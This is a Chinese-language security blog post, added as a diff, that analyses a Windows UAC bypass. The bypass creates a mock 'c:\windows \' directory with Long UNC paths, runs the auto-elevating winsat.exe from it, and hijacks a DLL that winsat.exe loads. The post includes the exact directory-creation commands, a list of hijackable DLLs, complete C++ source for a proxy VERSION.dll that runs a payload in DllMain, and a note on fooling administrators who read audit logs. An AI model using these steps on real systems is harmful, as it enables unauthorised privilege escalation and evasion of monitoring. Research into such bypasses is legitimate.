@@ -1,0 +1,233 @@
+<article class="post">
+  <h1>通过模拟可信目录绕过UAC的利用分析</h1>
+
+  <div class="entry">
+    <h2 id="0x00-前言">0x00 前言</h2>
+<hr>
+
+<p>从@CE2Wells的博客学到的一个技巧，通过模拟可信目录能够绕过UAC，本文将对结合自己的经验对这个方法进行介绍，添加自己的理解，分享测试中的细节</p>
+
+<p>文章地址：</p>
+
+<p>https://medium.com/tenable-techblog/uac-bypass-by-mocking-trusted-directories-24a96675f6e</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr>
+
+<ul>
+  <li>原理介绍</li>
+  <li>实现细节</li>
+  <li>实际测试</li>
+  <li>利用分析</li>
+</ul>
+
+<h2 id="0x02-原理介绍">0x02 原理介绍</h2>
+<hr>
+
+<h3 id="1long-unc">1、Long UNC</h3>
+
+<p>在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/Catalog%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0-Long-UNC%E6%96%87%E4%BB%B6%E5%90%8D%E6%AC%BA%E9%AA%97/">《Catalog签名伪造——Long UNC文件名欺骗》</a>曾介绍过exe文件使用Long UNC后能够欺骗系统，将其识别为另一个文件</p>
+
+<p>例如：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>type putty.exe &gt; "\\?\C:\Windows\System32\calc.exe "
+</code></pre></div></div>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-8/2-0.png" alt="Alt text"></p>
+
+<p>这个方法同样适用于文件夹</p>
+
+<p>例如：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>md "\\?\c:\windows "
+</code></pre></div></div>
+
+<p>新创建的文件夹能够欺骗系统，将其识别为另一个文件夹</p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-8/2-1.png" alt="Alt text"></p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-8/2-2.png" alt="Alt text"></p>
+
+<h3 id="2默认能够绕过uac的文件">2、默认能够绕过UAC的文件</h3>
+
+<p>需要满足以下三个条件：</p>
+
+<ul>
+  <li>程序配置为自动提升权限，以管理员权限执行</li>
+  <li>程序包含签名</li>
+  <li>从受信任的目录(<code class="language-plaintext highlighter-rouge">"c:\windows\system32"</code>)执行</li>
+</ul>
+
+<h3 id="3普通用户权限能够在磁盘根目录创建文件夹">3、普通用户权限能够在磁盘根目录创建文件夹</h3>
+
+<p>例如，普通用户权限能够在c盘下创建文件夹</p>
+
+<h3 id="4dll劫持">4、dll劫持</h3>
+
+<p>exe程序如果在启动过程中需要加载dll，默认先搜索exe程序的同级目录</p>
+
+<p>综上，满足了绕过UAC的所有条件</p>
+
+<p>实现的思路如下：</p>
+
+<ol>
+  <li>找到一个默认能够绕过UAC的文件，例如<code class="language-plaintext highlighter-rouge">c:\windows\system32\winsat.exe</code></li>
+  <li>使用Long UNC创建一个特殊的文件夹<code class="language-plaintext highlighter-rouge">"c:\windows \"</code>，并将winsat.exe复制到该目录</li>
+  <li>执行winsat.exe，记录启动过程，发现启动时需要加载同级目录下的WINMM.dll</li>
+  <li>编写payload.dll，指定导出函数同<code class="language-plaintext highlighter-rouge">c:\windows\system32\winmm.dll</code>相同，并命名为<code class="language-plaintext highlighter-rouge">"c:\windows \system32\WINMM.dll"</code></li>
+  <li>执行<code class="language-plaintext highlighter-rouge">"c:\windows \system32\winsat.exe"</code>，将自动绕过UAC，加载<code class="language-plaintext highlighter-rouge">"c:\windows \system32\WINMM.dll"</code>，执行payload</li>
+</ol>
+
+<h2 id="0x03-实现细节">0x03 实现细节</h2>
+<hr>
+
+<h3 id="1寻找可供利用的exe">1、寻找可供利用的exe</h3>
+
+<p>这些文件的特征之一是manifest中的autoElevate属性为true</p>
+
+<p>可以借助powershell实现自动化搜索，参考工具：</p>
+
+<p>https://github.com/g3rzi/Manifesto</p>
+
+<p>界面化的工具使用如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-8/2-3.png" alt="Alt text"></p>
+
+<h3 id="2使用long-unc创建一个特殊的文件夹cwindows-">2、使用Long UNC创建一个特殊的文件夹<code class="language-plaintext highlighter-rouge">"c:\windows \"</code></h3>
+
+<p>C++的实现代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CreateDirectoryW(L"\\\\?\\C:\\Windows \\", 0);
+</code></pre></div></div>
+
+<p>通过命令行实现的命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>md "\\?\c:\windows "
+</code></pre></div></div>
+
+<h3 id="3记录winsatexe的启动过程寻找启动时加载的dll">3、记录winsat.exe的启动过程，寻找启动时加载的dll</h3>
+
+<p>这里可以使用Process Monitor，筛选出启动过程中结果为”NAME NOT FOUND”的记录，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-8/2-4.png" alt="Alt text"></p>
+
+<p>因此，可供利用的dll名称如下：</p>
+
+<ul>
+  <li>VERSION.dll</li>
+  <li>WINMM.dll</li>
+  <li>POWRPROF.dll</li>
+  <li>dxgi.dll</li>
+  <li>dwmapi.dll</li>
+  <li>d3d10_1.dll</li>
+  <li>d3d1-_1core.dll</li>
+  <li>d3d11.dll</li>
+  <li>d3d10core.dll</li>
+  <li>QUARTZ.dll</li>
+</ul>
+
+<p>任选一个即可</p>
+
+<h3 id="4编写payloaddll指定导出函数">4、编写payload.dll，指定导出函数</h3>
+
+<p>这里可以使用exportstoc，下载地址：</p>
+
+<p>https://github.com/michaellandi/exportstoc</p>
+
+<p>详细使用说明可参考之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/Study-Notes-Weekly-No.1(Monitor-WMI_ExportsToC++_Use-DiskCleanup-bypass-UAC)/">《Study Notes Weekly No.1(Monitor WMI &amp; ExportsToC++ &amp; Use DiskCleanup bypass UAC)》</a></p>
+
+<p>例如这里选择<code class="language-plaintext highlighter-rouge">VERSION.dll</code>，劫持的原dll路径为<code class="language-plaintext highlighter-rouge">c:\\Windows\\system32\\version.dll</code>，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-8/2-5.png" alt="Alt text"></p>
+
+<p>添加payload为启动计算器，最终的代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include "stdafx.h"
+#include &lt;iostream&gt;
+#include &lt;windows.h&gt;
+
+using namespace std;
+
+#pragma comment (linker, "/export:GetFileVersionInfoA=c:\\windows\\system32\\version.GetFileVersionInfoA,@1")
+#pragma comment (linker, "/export:GetFileVersionInfoByHandle=c:\\windows\\system32\\version.GetFileVersionInfoByHandle,@2")
+#pragma comment (linker, "/export:GetFileVersionInfoExW=c:\\windows\\system32\\version.GetFileVersionInfoExW,@3")
+#pragma comment (linker, "/export:GetFileVersionInfoSizeA=c:\\windows\\system32\\version.GetFileVersionInfoSizeA,@4")
+#pragma comment (linker, "/export:GetFileVersionInfoSizeExW=c:\\windows\\system32\\version.GetFileVersionInfoSizeExW,@5")
+#pragma comment (linker, "/export:GetFileVersionInfoSizeW=c:\\windows\\system32\\version.GetFileVersionInfoSizeW,@6")
+#pragma comment (linker, "/export:GetFileVersionInfoW=c:\\windows\\system32\\version.GetFileVersionInfoW,@7")
+#pragma comment (linker, "/export:VerFindFileA=c:\\windows\\system32\\version.VerFindFileA,@8")
+#pragma comment (linker, "/export:VerFindFileW=c:\\windows\\system32\\version.VerFindFileW,@9")
+#pragma comment (linker, "/export:VerInstallFileA=c:\\windows\\system32\\version.VerInstallFileA,@10")
+#pragma comment (linker, "/export:VerInstallFileW=c:\\windows\\system32\\version.VerInstallFileW,@11")
+#pragma comment (linker, "/export:VerLanguageNameA=c:\\windows\\system32\\version.VerLanguageNameA,@12")
+#pragma comment (linker, "/export:VerLanguageNameW=c:\\windows\\system32\\version.VerLanguageNameW,@13")
+#pragma comment (linker, "/export:VerQueryValueA=c:\\windows\\system32\\version.VerQueryValueA,@14")
+#pragma comment (linker, "/export:VerQueryValueW=c:\\windows\\system32\\version.VerQueryValueW,@15")
+
+BOOL WINAPI DllMain(HINSTANCE hInst,DWORD reason,LPVOID)
+{
+	system("start calc.exe");
+	return true;
+}
+</code></pre></div></div>
+
+<p>将其编译成dll，另存为<code class="language-plaintext highlighter-rouge">"c:\windows \system32\VERSION.dll"</code>，</p>
+
+<h3 id="5启动exe">5、启动exe</h3>
+
+<p>命令行下启动需要绝对路径：<code class="language-plaintext highlighter-rouge">"c:\windows \system32\winsat.exe"</code></p>
+
+<p><strong>注：</strong></p>
+
+<p>这里不可以使用短文件名(短文件名通过<code class="language-plaintext highlighter-rouge">"dir /x"</code>获得）</p>
+
+<h2 id="0x04-利用分析">0x04 利用分析</h2>
+<hr>
+
+<p>1、可供利用的位置不唯一</p>
+
+<p>在我的测试系统(Win7 x64)中,可供利用的exe有39个，可供利用的dll也有很多</p>
+
+<p>2、对于Long UNC这种文件夹还有其他形式</p>
+
+<p>例如：</p>
+
+<ul>
+  <li>文件名可以包含多个空格： <code class="language-plaintext highlighter-rouge">"\\?\C:\Windows    "</code></li>
+  <li>使用字符<code class="language-plaintext highlighter-rouge">"."</code>(最少两个)： <code class="language-plaintext highlighter-rouge">"\\?\C:\Windows.."</code></li>
+</ul>
+
+<p>但其他形式的文件夹无法用来绕过UAC</p>
+
+<p>3、使用Long UNC创建伪造的文件夹能够欺骗“粗心的管理员”</p>
+
+<p>例如系统开启<code class="language-plaintext highlighter-rouge">Windows command line process auditing</code>，记录程序运行的参数</p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-8/3-1.png" alt="Alt text"></p>
+
+<p>肉眼很难分辨</p>
+
+<h2 id="0x05-小结">0x05 小结</h2>
+<hr>
+
+<p>本文对通过模拟可信目录绕过UAC的方法进行分析，分享测试中的细节</p>
+
+<hr>
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+
+  </div>
+
+  <div class="date">
+    Written on February  8, 2019
+  </div>
+
+  
+</article>
